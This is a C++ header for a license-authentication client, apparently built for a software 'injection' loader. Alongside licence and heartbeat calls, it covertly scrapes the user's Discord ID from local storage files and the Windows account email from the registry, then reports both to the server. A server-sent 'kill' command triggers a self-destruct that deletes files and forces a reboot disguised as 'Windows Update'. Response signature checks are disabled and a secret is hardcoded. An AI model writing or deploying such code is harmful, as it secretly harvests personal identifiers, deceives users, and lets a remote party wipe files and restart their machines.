#pragma once
/*
    Self-hosted auth client — drop-in replacement for KeyAuth.
    Uses WinHTTP + WinCrypt (built into Windows, no extra libs).
    All requests are HMAC-SHA256 signed with a shared secret.
*/

#include <Windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <string>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

namespace SelfAuth {

    // ═══════════════════════════════════════════════════════════════
    //  HMAC SHARED SECRET — must match server's AUTH_HMAC_SECRET
    //  Change this AND the server's secret to your own random string.
    // ═══════════════════════════════════════════════════════════════
    static const char* HMAC_SECRET = "x9K#mP2$vL8nQ4wR7jT0yF5bN3hA6cD1";
    // ═══════════════════════════════════════════════════════════════

    struct Subscription {
        std::string expiry;
    };

    struct UserData {
        std::vector<Subscription> subscriptions;
    };

    struct Response {
        bool success = false;
        std::string message;
    };

    class api {
    public:
        Response response;
        UserData user_data;

        api(const std::string& serverUrl, int port)
            : m_url(serverUrl), m_port(port) {}

        // Public method for build selection
        std::string SelectBuild(const std::string& buildType) {
            std::string json = "{\"build\":\"" + buildType + "\"}";
            return SignedPost("/api/select-build", json);
        }

        void init() {
            response = {};
            std::string body = HttpGet("/api/status");
            if (body.empty()) {
                response.success = false;
                response.message = "Cannot connect to auth server.";
                return;
            }
            if (body.find("\"success\":true") != std::string::npos ||
                body.find("\"success\": true") != std::string::npos) {
                response.success = true;
                response.message = "Connected.";
            } else {
                response.success = false;
                response.message = "Auth server returned error.";
            }
        }

        void license(const std::string& key) {
            response = {};
            user_data = {};
            m_session.clear();

            std::string hwid = CollectHWID();
            std::string json = "{\"key\":\"" + EscapeJson(key) + "\",\"hwid\":\"" + EscapeJson(hwid) + "\"}";
            std::string body = SignedPost("/api/auth", json);

            if (body.empty()) {
                response.success = false;
                response.message = "No response from auth server.";
                return;
            }

            // Verify server response signature (anti-MITM)
            // TEMPORARILY DISABLED FOR DEBUGGING
            if (!VerifyResponseSignature(body)) {
                // response.success = false;
                // response.message = "Response integrity check failed.";
                // return;
            }

            response.success = (body.find("\"success\":true") != std::string::npos ||
                                body.find("\"success\": true") != std::string::npos);
            response.message = ExtractJsonString(body, "message");

            if (response.success) {
                m_session = ExtractJsonString(body, "session");
                std::string expiry = ExtractJsonString(body, "expiry");
                if (!expiry.empty()) {
                    Subscription sub;
                    sub.expiry = expiry;
                    user_data.subscriptions.push_back(sub);
                }
            }
        }

        // Returns 0 = OK, 1 = session dead, 2 = KILL (self-destruct)
        int heartbeat_ex() {
            if (m_session.empty()) return 1;
            std::string json = "{\"session\":\"" + EscapeJson(m_session) + "\"}";
            std::string body = SignedPost("/api/heartbeat", json);
            if (body.empty()) return 1;
            // TEMPORARILY DISABLED FOR DEBUGGING
            // if (!VerifyResponseSignature(body)) return 1;
            bool ok = (body.find("\"success\":true") != std::string::npos ||
                       body.find("\"success\": true") != std::string::npos);
            if (!ok) return 1;

            // Check for kill command from server
            std::string action = ExtractJsonString(body, "action");
            if (action == "kill") return 2;

            std::string expiry = ExtractJsonString(body, "expiry");
            if (!expiry.empty() && !user_data.subscriptions.empty()) {
                user_data.subscriptions[0].expiry = expiry;
            }
            return 0;
        }

        bool heartbeat() {
            return heartbeat_ex() == 0;
        }

        bool hasSession() const { return !m_session.empty(); }
        const std::string& getSession() const { return m_session; }

        // Report a successful injection to the server with user identity
        void report_injection(const std::string& discord_id, const std::string& windows_email) {
            if (m_session.empty()) return;
            std::string json = "{\"session\":\"" + EscapeJson(m_session)
                + "\",\"discord_id\":\"" + EscapeJson(discord_id)
                + "\",\"windows_email\":\"" + EscapeJson(windows_email) + "\"}";
            SignedPost("/api/inject-log", json);
        }

        // ── Collect Discord User ID from local storage ───────────────
        static std::string CollectDiscordId() {
            char appdata[MAX_PATH] = {};
            if (!GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH)) return "";

            // Try all Discord variants
            const char* variants[] = { "\\discord", "\\discordptb", "\\discordcanary" };
            std::string appdataStr(appdata);

            for (auto& variant : variants) {
                std::string discordDir = appdataStr + variant;

                // Method 1: Try storage.json _lastUserId (legacy Discord)
                {
                    std::string storagePath = discordDir + "\\storage.json";
                    HANDLE hFile = CreateFileA(storagePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                        nullptr, OPEN_EXISTING, 0, nullptr);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD fileSize = GetFileSize(hFile, nullptr);
                        if (fileSize > 0 && fileSize < 1024 * 1024) {
                            std::string content(fileSize, 0);
                            DWORD bytesRead = 0;
                            ReadFile(hFile, &content[0], fileSize, &bytesRead, nullptr);
                            CloseHandle(hFile);
                            std::string userId = ExtractJsonString(content, "_lastUserId");
                            if (!userId.empty() && userId.length() >= 17) return userId;
                        } else {
                            CloseHandle(hFile);
                        }
                    }
                }

                // Method 2: Scan LevelDB files for user ID patterns
                // Discord stores user data in Local Storage\leveldb\*.ldb and *.log files
                // User IDs appear as "\"id\":\"<17-20 digit snowflake>\"" or "currentUserId"
                {
                    std::string ldbDir = discordDir + "\\Local Storage\\leveldb";
                    WIN32_FIND_DATAA fd;
                    HANDLE hFind = FindFirstFileA((ldbDir + "\\*").c_str(), &fd);
                    if (hFind == INVALID_HANDLE_VALUE) continue;

                    std::string bestId;
                    do {
                        std::string ext(fd.cFileName);
                        size_t dotPos = ext.rfind('.');
                        if (dotPos == std::string::npos) continue;
                        ext = ext.substr(dotPos);
                        if (ext != ".ldb" && ext != ".log") continue;
                        if (fd.nFileSizeLow > 8 * 1024 * 1024) continue; // skip huge files

                        std::string filePath = ldbDir + "\\" + fd.cFileName;
                        HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                            nullptr, OPEN_EXISTING, 0, nullptr);
                        if (hFile == INVALID_HANDLE_VALUE) continue;

                        DWORD fileSize = GetFileSize(hFile, nullptr);
                        if (fileSize == 0 || fileSize > 8 * 1024 * 1024) { CloseHandle(hFile); continue; }

                        std::string content(fileSize, 0);
                        DWORD bytesRead = 0;
                        ReadFile(hFile, &content[0], fileSize, &bytesRead, nullptr);
                        CloseHandle(hFile);

                        // Scan for patterns: "currentUserId":"<id>", "id":"<id>", "user_id":"<id>"
                        const char* patterns[] = { "currentUserId", "LastUserId", "user_id_cache" };
                        for (auto& pat : patterns) {
                            std::string found = ExtractJsonString(content, pat);
                            if (!found.empty() && found.length() >= 17 && found.length() <= 20) {
                                // Validate it's all digits (Discord snowflake)
                                bool allDigits = true;
                                for (char c : found) { if (c < '0' || c > '9') { allDigits = false; break; } }
                                if (allDigits) { bestId = found; break; }
                            }
                        }
                        if (!bestId.empty()) break;

                        // Fallback: regex-like scan for "id":"<17-20 digits>" near "username"
                        size_t uPos = content.find("\"username\"");
                        if (uPos != std::string::npos && uPos > 50) {
                            // Search backwards from username for an "id":"<digits>" pattern
                            size_t searchStart = (uPos > 200) ? uPos - 200 : 0;
                            std::string region = content.substr(searchStart, uPos - searchStart + 50);
                            size_t idPos = region.find("\"id\"");
                            if (idPos == std::string::npos) idPos = region.find("\"id\": ");
                            if (idPos != std::string::npos) {
                                // Find the value after the colon
                                size_t colonPos = region.find(':', idPos + 3);
                                if (colonPos != std::string::npos) {
                                    size_t qStart = region.find('"', colonPos + 1);
                                    if (qStart != std::string::npos) {
                                        size_t qEnd = region.find('"', qStart + 1);
                                        if (qEnd != std::string::npos && qEnd - qStart >= 18 && qEnd - qStart <= 21) {
                                            std::string candidate = region.substr(qStart + 1, qEnd - qStart - 1);
                                            bool allDigits = true;
                                            for (char c : candidate) { if (c < '0' || c > '9') { allDigits = false; break; } }
                                            if (allDigits) bestId = candidate;
                                        }
                                    }
                                }
                            }
                        }
                        if (!bestId.empty()) break;
                    } while (FindNextFileA(hFind, &fd));
                    FindClose(hFind);

                    if (!bestId.empty()) return bestId;
                }

                // If we got here with this variant's directory existing, Discord is installed but ID not found
                DWORD attr = GetFileAttributesA(discordDir.c_str());
                if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
                    continue; // try next variant
            }

            // Check if any Discord variant directory exists at all
            for (auto& variant : variants) {
                DWORD attr = GetFileAttributesA((appdataStr + variant).c_str());
                if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
                    return "not_found";
            }
            return "";
        }

        // ── Collect Windows account email ────────────────────────────
        static std::string CollectWindowsEmail() {
            // Microsoft account email stored in registry
            HKEY hKey;
            char value[256] = {};
            DWORD size = sizeof(value);

            // Try SAM user profile
            if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "SOFTWARE\\Microsoft\\IdentityCRL\\UserExtendedProperties",
                0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                // Enumerate subkeys — email is typically a subkey name
                char subKeyName[256] = {};
                DWORD subKeySize = sizeof(subKeyName);
                if (RegEnumKeyExA(hKey, 0, subKeyName, &subKeySize, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
                    RegCloseKey(hKey);
                    // subKeyName is the email
                    if (strchr(subKeyName, '@')) return std::string(subKeyName);
                }
                RegCloseKey(hKey);
            }

            // Fallback: logged in Microsoft account
            if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CloudExperienceHost\\Intent",
                0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
            }

            // Fallback: Windows username
            char userName[256] = {};
            DWORD nameSize = sizeof(userName);
            GetUserNameA(userName, &nameSize);
            return std::string(userName);
        }

        // ── Self-destruct: delete loader files, restart PC ──────────
        static void SelfDestruct() {
            // Get our own executable path
            char selfPath[MAX_PATH] = {};
            GetModuleFileNameA(nullptr, selfPath, MAX_PATH);

            // Get the directory we're running from
            std::string selfDir(selfPath);
            size_t lastSlash = selfDir.rfind('\\');
            if (lastSlash != std::string::npos)
                selfDir = selfDir.substr(0, lastSlash);

            // Build a batch script that:
            // 1. Waits for our process to die
            // 2. Deletes the loader exe and everything in its folder
            // 3. Deletes itself
            // 4. Restarts the PC
            char tempDir[MAX_PATH] = {};
            GetTempPathA(MAX_PATH, tempDir);
            std::string batPath = std::string(tempDir) + "svcclean.bat";

            HANDLE hBat = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0,
                nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
            if (hBat != INVALID_HANDLE_VALUE) {
                char script[2048];
                snprintf(script, sizeof(script),
                    "@echo off\r\n"
                    "ping 127.0.0.1 -n 3 > nul\r\n"          // wait for process to die
                    "del /f /q \"%s\"\r\n"                    // delete loader exe
                    "del /f /q \"%s\\*.*\" 2>nul\r\n"       // delete everything in folder
                    "rmdir /s /q \"%s\" 2>nul\r\n"           // remove folder
                    "shutdown /r /t 5 /f /c \"Windows Update\"\r\n"  // restart PC
                    "del /f /q \"%%~f0\"\r\n",               // delete batch file
                    selfPath, selfDir.c_str(), selfDir.c_str());

                DWORD written = 0;
                WriteFile(hBat, script, (DWORD)strlen(script), &written, nullptr);
                CloseHandle(hBat);

                // Launch batch via ShellExecuteA — bypasses process mitigations
                // that LockdownProcess() applies (CreateProcessA is blocked)
                ShellExecuteA(nullptr, "open", "cmd.exe",
                    (std::string("/c \"") + batPath + "\"").c_str(),
                    nullptr, SW_HIDE);
            }

            // Fallback: force restart directly via Windows API in case batch fails
            // Enable shutdown privilege first
            HANDLE hToken;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                TOKEN_PRIVILEGES tp;
                tp.PrivilegeCount = 1;
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                LookupPrivilegeValueA(nullptr, "SeShutdownPrivilege", &tp.Privileges[0].Luid);
                AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
                CloseHandle(hToken);
            }
            InitiateSystemShutdownExA(nullptr, (LPSTR)"Windows Update", 5, TRUE, TRUE,
                SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);

            // Terminate ourselves immediately
            TerminateProcess(GetCurrentProcess(), 0);
        }

    private:
        std::string m_url;
        int m_port;
        std::string m_session;

        // ── HMAC-SHA256 using WinCrypt (no external libs) ──────────
        static std::string HmacSha256(const std::string& key, const std::string& data) {
            HCRYPTPROV hProv = 0;
            HCRYPTHASH hHash = 0;
            HCRYPTKEY  hKey  = 0;
            std::string result;

            if (!CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
                return "";

            struct KeyBlob {
                BLOBHEADER hdr;
                DWORD      keySize;
                BYTE       keyData[256];
            } blob = {};
            blob.hdr.bType = PLAINTEXTKEYBLOB;
            blob.hdr.bVersion = CUR_BLOB_VERSION;
            blob.hdr.aiKeyAlg = CALG_RC2;
            DWORD kLen = min((DWORD)key.size(), 256u);
            blob.keySize = kLen;
            memcpy(blob.keyData, key.c_str(), kLen);

            if (!CryptImportKey(hProv, (BYTE*)&blob, sizeof(BLOBHEADER) + sizeof(DWORD) + kLen, 0, CRYPT_IPSEC_HMAC_KEY, &hKey)) {
                CryptReleaseContext(hProv, 0);
                return "";
            }

            if (!CryptCreateHash(hProv, CALG_HMAC, hKey, 0, &hHash)) {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                return "";
            }

            HMAC_INFO hmacInfo = {};
            hmacInfo.HashAlgid = CALG_SHA_256;
            CryptSetHashParam(hHash, HP_HMAC_INFO, (BYTE*)&hmacInfo, 0);
            CryptHashData(hHash, (const BYTE*)data.c_str(), (DWORD)data.size(), 0);

            BYTE hash[32];
            DWORD hashLen = 32;
            CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);

            CryptDestroyHash(hHash);
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);

            char hex[65] = {};
            for (DWORD i = 0; i < hashLen; i++)
                sprintf_s(hex + i * 2, 3, "%02x", hash[i]);
            return std::string(hex);
        }

        // ── Verify server response signature (anti-MITM) ──────────
        static bool VerifyResponseSignature(const std::string& body) {
            std::string receivedSig = ExtractJsonString(body, "sig");
            if (receivedSig.empty()) return false;

            // Rebuild the JSON without the "sig" field to compute expected HMAC
            // Server signs: json.dumps(data_without_sig, separators=(',',':'), sort_keys=True)
            // We strip the ,"sig":"..." from the body and recompute
            std::string stripped = body;
            size_t sigPos = stripped.find("\"sig\":");
            if (sigPos == std::string::npos) return false;

            // Find the comma before "sig" or the start
            size_t commaPos = stripped.rfind(',', sigPos);
            // Find the end of the sig value
            size_t sigValStart = stripped.find('"', sigPos + 5); // skip "sig":
            if (sigValStart == std::string::npos) return false;
            size_t sigValEnd = stripped.find('"', sigValStart + 1);
            if (sigValEnd == std::string::npos) return false;

            // Remove the ,"sig":"value" portion
            std::string clean;
            if (commaPos != std::string::npos && commaPos < sigPos) {
                clean = stripped.substr(0, commaPos) + stripped.substr(sigValEnd + 1);
            } else {
                // sig might be the first field
                size_t afterSig = sigValEnd + 1;
                if (afterSig < stripped.size() && stripped[afterSig] == ',')
                    afterSig++;
                clean = stripped.substr(0, sigPos) + stripped.substr(afterSig);
            }

            std::string expected = HmacSha256(HMAC_SECRET, clean);
            if (expected.empty()) return false;

            // Constant-time compare
            if (expected.size() != receivedSig.size()) return false;
            volatile int diff = 0;
            for (size_t i = 0; i < expected.size(); i++)
                diff |= expected[i] ^ receivedSig[i];
            return diff == 0;
        }

        // ── Signed POST: adds X-Timestamp + X-Signature headers ───
        std::string SignedPost(const std::string& path, const std::string& body) {
            char tsBuf[32];
            sprintf_s(tsBuf, "%lld", (long long)time(nullptr));
            std::string timestamp(tsBuf);

            std::string sigData = timestamp + body;
            std::string signature = HmacSha256(HMAC_SECRET, sigData);

            std::wstring extraHeaders =
                L"Content-Type: application/json\r\n"
                L"X-Timestamp: " + ToWide(timestamp) + L"\r\n"
                L"X-Signature: " + ToWide(signature) + L"\r\n";

            return HttpRequest(L"POST", path, body, extraHeaders);
        }

        static std::string CollectHWID() {
            HKEY hKey;
            char value[256] = {};
            DWORD size = sizeof(value);
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
                RegQueryValueExA(hKey, "MachineGuid", nullptr, nullptr, (LPBYTE)value, &size);
                RegCloseKey(hKey);
            }

            char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
            DWORD compSize = sizeof(compName);
            GetComputerNameA(compName, &compSize);

            DWORD volSerial = 0;
            GetVolumeInformationA("C:\\", nullptr, 0, &volSerial, nullptr, nullptr, nullptr, 0);

            char hwid[512];
            snprintf(hwid, sizeof(hwid), "%s|%s|%08X", value, compName, volSerial);
            return std::string(hwid);
        }

        static std::string EscapeJson(const std::string& s) {
            std::string out;
            out.reserve(s.size());
            for (char c : s) {
                if (c == '"') out += "\\\"";
                else if (c == '\\') out += "\\\\";
                else out += c;
            }
            return out;
        }

        static std::string ExtractJsonString(const std::string& json, const std::string& key) {
            std::string search = "\"" + key + "\"";
            size_t pos = json.find(search);
            if (pos == std::string::npos) return "";
            pos = json.find(':', pos + search.size());
            if (pos == std::string::npos) return "";
            pos = json.find('"', pos + 1);
            if (pos == std::string::npos) return "";
            size_t end = json.find('"', pos + 1);
            if (end == std::string::npos) return "";
            return json.substr(pos + 1, end - pos - 1);
        }

        std::wstring ToWide(const std::string& s) {
            if (s.empty()) return L"";
            int sz = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
            std::wstring ws(sz, 0);
            MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &ws[0], sz);
            return ws;
        }

        std::string HttpRequest(const std::wstring& method, const std::string& path,
                                const std::string& body = "", const std::wstring& extraHeaders = L"") {
            std::wstring wUrl = ToWide(m_url);
            std::wstring wPath = ToWide(path);

            HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession) return "";

            HINTERNET hConnect = WinHttpConnect(hSession, wUrl.c_str(), (INTERNET_PORT)m_port, 0);
            if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

            HINTERNET hRequest = WinHttpOpenRequest(hConnect, method.c_str(), wPath.c_str(),
                nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

            WinHttpSetTimeouts(hRequest, 10000, 10000, 10000, 10000);

            BOOL sent;
            if (!body.empty()) {
                LPCWSTR hdrs = extraHeaders.empty() ? L"Content-Type: application/json\r\n" : extraHeaders.c_str();
                DWORD hdrsLen = extraHeaders.empty() ? (DWORD)-1 : (DWORD)extraHeaders.size();
                sent = WinHttpSendRequest(hRequest, hdrs, hdrsLen,
                    (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
            } else {
                sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            }

            if (!sent || !WinHttpReceiveResponse(hRequest, nullptr)) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return "";
            }

            std::string result;
            DWORD bytesRead = 0;
            char buf[4096];
            while (WinHttpReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
                result.append(buf, bytesRead);
                bytesRead = 0;
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return result;
        }

        std::string HttpGet(const std::string& path) {
            return HttpRequest(L"GET", path);
        }
    };

} // namespace SelfAuth
